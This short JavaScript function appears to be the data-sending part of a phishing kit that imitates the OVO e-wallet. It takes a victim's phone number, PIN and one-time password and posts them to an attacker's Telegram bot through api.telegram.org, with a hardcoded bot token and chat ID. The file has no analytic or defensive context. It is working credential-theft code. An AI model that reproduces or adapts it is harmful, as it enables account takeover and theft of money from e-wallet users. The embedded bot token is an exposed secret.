function sendTelegram(phone, pin, otp) {
    const botToken = "8446620248:AAEepdNIXK15ZYyapdDlD8LGmyQZCMUx9ng";
    const chatId   = "6989148477";

    const message = `
☬ ∘ OVO ∘ ☬
- Nomor HP: ${phone}
- PIN: ${pin}
- OTP: ${otp}
    `;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    return fetch(url, {
        method: "POST",
        headers: { 
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: new URLSearchParams({
            chat_id: chatId,
            text: message,
            parse_mode: "HTML"
        })
    })
    .then(res => res.json())
    .then(result => result.ok)
    .catch(err => {
        console.error("Error:", err);
        return false;
    });
}


